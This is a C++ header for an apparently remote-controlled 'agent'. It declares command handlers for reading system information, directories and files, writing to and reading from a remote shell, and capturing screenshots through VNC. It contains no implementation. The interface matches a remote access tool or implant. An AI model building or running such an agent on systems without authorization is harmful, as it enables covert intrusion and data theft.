#pragma once

#include "primitives.h"
#include "shell.h"
#include "vnc.h"

// Enum to represent the different command types that can be handled by the agent
enum CommandType : UINT8
{
    Command_GetSystemInfo = 0,
    Command_GetDirectoryContent = 1,
    Command_GetFileContent = 2,
    Command_GetFileChunkHash = 3,
    Command_WriteShell = 4,
    Command_ReadShell = 5,
    Command_GetDisplays = 6,
    Command_GetScreenshot = 7,
    CommandTypeCount
};

// Status codes for command handling results
enum StatusCode : UINT32
{
    StatusSuccess = 0,
    StatusError = 1,
    StatusUnknownCommand = 2
};

// Context structure to hold state information for command handlers, such as shell and VNC context instances
struct Context
{
    Shell *shell = nullptr;
    VNCContext *vncContext = nullptr;

    ~Context()
    {
        if (this->shell != nullptr)
        {
            delete this->shell;
            this->shell = nullptr; // Good practice to avoid double-free
        }
        if (this->vncContext != nullptr)
        {
            delete this->vncContext;
            this->vncContext = nullptr; // Good practice to avoid double-free
        }
    }
};

// Type definition for command handler function pointers
using CommandHandler = VOID (*)(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);

// Command handler function declarations
VOID Handle_GetSystemInfoCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetDisplaysCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetScreenshotCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);